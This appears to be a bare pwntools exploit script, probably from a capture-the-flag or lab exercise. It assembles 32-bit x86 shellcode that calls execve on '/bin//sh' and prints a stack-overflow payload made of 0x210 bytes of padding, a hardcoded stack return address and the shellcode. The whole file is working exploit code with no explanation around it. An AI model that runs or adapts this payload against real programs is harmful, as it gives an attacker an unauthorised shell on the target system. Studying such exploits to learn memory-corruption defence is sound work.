#! /usr/bin/env python

from pwn import *

shell = """
push eax;
pop ecx;
push eax;
pop edx;
push eax;
push 0x%s;
push 0x%s;
push esp;
pop ebx;
inc eax;
inc eax;
inc eax;
inc eax;
inc eax;
inc eax;
inc eax;
inc eax;
inc eax;
inc eax;
inc eax;
int 0x80;
""" % ( "//sh"[::-1].encode('hex'), "/bin"[::-1].encode('hex') )

a = asm(shell)

#print a + 'A' * (0x210 - len(a)) + '\x7c\xd3\xff\xff',
print 'A' * (0x210 ) + '\x70\xd5\xff\xff' + a,
